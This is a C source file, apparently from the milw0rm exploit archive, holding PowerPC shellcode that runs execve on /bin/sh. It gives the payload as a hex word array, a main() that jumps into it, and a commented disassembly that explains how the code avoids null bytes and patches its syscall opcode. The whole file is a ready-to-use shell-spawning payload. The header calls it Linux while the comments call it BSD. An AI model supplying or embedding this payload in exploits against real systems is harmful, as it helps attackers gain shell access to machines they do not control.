/*
 *  Linux PPC shellcode
 *  execve() of /bin/sh by Palante
 */

long shellcode[] = { /* Palante's BSD PPC shellcode w/ NULL*/
  0x7CC63278, 0x2F867FFF, 0x41BC005C, 0x7C6802A6,
  0xB0C3FFF9, 0xB0C3FFF1, 0x38867FF0, 0x38A67FF4,
  0x38E67FF3, 0x7CA52278, 0x7CE72278, 0x7C853A14,
  0x7CC419AE, 0x7C8429D6, 0x7C842214, 0x7C043A14,
  0x7CE72850, 0x7C852A14, 0x7C63212E, 0x7C832214,
  0x7CC5212E, 0x7CA52A78, 0x44FFFF02, 0x7CE03B78,
  0x44FFFF02, 0x4BFFFFA9, 0x2F62696E, 0x2F73685A,
  0xFFFFFFFF, 0xFFFFFFFF
};


void main()
{
  __asm__("b shellcode");
}

/*              disassembly

        .section ".text"      # Palante's BSD PPC shellcode
        .align 2
        .globl m
        .type    m,@function
m:
	xor  6,6,6            # r6 is 0
	cmpi  7,0,6,0x7FFF    # do meaningless compare
        bc 13,28,L2           # conditional branch to L2 # CAUSES NULL BYTE
L1:     mfspr 3,8	      # address of /bin/sh into r3 (execve parameter)

	sth  6,-7(3)          # fix sc opcode
	sth  6,-15(3)         # fix sc opcode

	addi 4,6,0x7FF0
	addi 5,6,0x7FF4
	addi 7,6,0x7FF3
	xor  5,5,4            #got 0x4 into r5
	xor  7,7,4            #got 0x3 into r7


	add  4,5,7            # r4 = 0x7
	stbx 6,4,3            # store null after /bin/sh

	mullw 4,4,5           # r4 = 0x1c (28)
        add  4,4,4            # r4 = 0x38 (56)
	add  0,4,7            # this makes 59 which is the execve system call

        sub  7,5,7            # r7 = 0x1 for exit system call

        add  4,5,5            # r4 = 0x8
        stwx 3,3,4            # and store pointer to /bin/sh at r3+0x8
	add  4,3,4            # r4 = r3 + 0x8 (execve parameter)
	stwx 6,5,4            # store NULL pointer
        xor 5,5,5             # NULL (execve parameter)
.long   0x44ffff02            # not quite an sc opcode
	or 0,7,7              # syscall 1 - exit
.long   0x44ffff02            # not quite an sc opcode

L2:     bl L1                 # branch and link back to L1
.long 0x2F62696E              #/bin/shZ
.long 0x2F73685A
.long 0xffffffff              # this is where pointer to /bin/sh goes
.long 0xffffffff              # this is where null pointer goes

.Lfe1:
.size    m,.Lfe1-m

*/

// milw0rm.com [2004-09-26]